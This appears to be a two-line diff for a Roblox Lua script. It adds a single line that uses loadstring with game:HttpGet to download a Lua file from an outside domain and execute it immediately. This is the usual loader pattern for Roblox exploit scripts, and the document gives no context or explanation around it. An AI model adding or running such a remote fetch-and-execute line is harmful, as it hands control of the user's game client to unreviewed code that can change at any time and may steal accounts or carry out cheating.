@@ -1,0 +1,2 @@
+
+loadstring(game:HttpGet("https://egorikusa.space/fd72298442be7bd0c961de77.lua", true))()
